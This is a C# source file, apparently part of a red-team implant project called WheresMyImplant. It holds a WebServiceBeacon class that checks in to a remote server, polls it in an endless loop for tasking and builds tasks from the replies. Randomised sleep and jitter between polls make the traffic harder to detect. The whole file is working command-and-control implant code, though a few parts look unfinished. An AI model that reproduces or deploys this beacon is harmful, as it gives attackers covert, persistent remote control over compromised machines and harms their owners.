using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.ServiceModel;
using System.Threading;

namespace WheresMyImplant
{

    class WebServiceBeacon : IDisposable
    {
        private ChannelFactory<IServiceBeaconEndpoint> channelFactory;
        private Dictionary<String, BeaconTask> task = new Dictionary<String, BeaconTask>();

        private String uuid = null;
        private String socket = null;
        private String provider = null;

        private Int32 sleep = 5;
        private Int32 jitter = 2;

        ////////////////////////////////////////////////////////////////////////////////
        //new NetTcpBinding(),
        //String.Format("net.tcp://{0}:{1}",endpoint, port)
        ////////////////////////////////////////////////////////////////////////////////
        internal WebServiceBeacon(String socket, String provider)
        {
            this.socket = socket;
            this.provider = provider;
        }

        #region sleep
        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void SetSleepInterval(String interval)
        {
            Int32 result = sleep;
            Int32.TryParse(interval, out result);
            SetSleepInterval(result);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void SetSleepInterval(Int32 interval)
        {
            sleep = interval;
        }
        #endregion

        #region jitter
        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void SetJitter(String interval)
        {
            Int32 result = jitter;
            Int32.TryParse(interval, out result);
            SetJitter(result);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void SetJitter(Int32 interval)
        {
            jitter = interval;
        }
        #endregion

        #region uuid
        ////////////////////////////////////////////////////////////////////////////////
        // https://stackoverflow.com/questions/1344221/how-can-i-generate-random-alphanumeric-strings-in-c
        ////////////////////////////////////////////////////////////////////////////////
        internal void GenerateUuid(int length)
        {
            Random random = new Random();
            const String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            uuid = new String(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }
        #endregion

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void Run()
        {
            String url = String.Format("http://{0}/{1}", socket, provider);
            Console.WriteLine(url);
            GenerateUuid(8);
            Console.WriteLine(uuid);
            if (!WebServiceBeaconComs.Checkin(url, uuid))
            {
                return;
            }

            while (true)
            {
                String output = "";
                if (!WebServiceBeaconComs.InvokeRequest(url, "TaskingRequest", new String[] { uuid }, ref output))
                {
                    return;
                }
                if ("" != output)
                {
                    BeaconTask task = new BeaconTask(output, uuid, url);

                }
                Thread.Sleep((sleep * 1000) + (new Random().Next(0, jitter) * 1000));
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public void Dispose()
        {
            try
            {
                channelFactory.Close();
            }
            catch (NullReferenceException)
            {
                Console.WriteLine("Already closed");
            }
        }
    }
}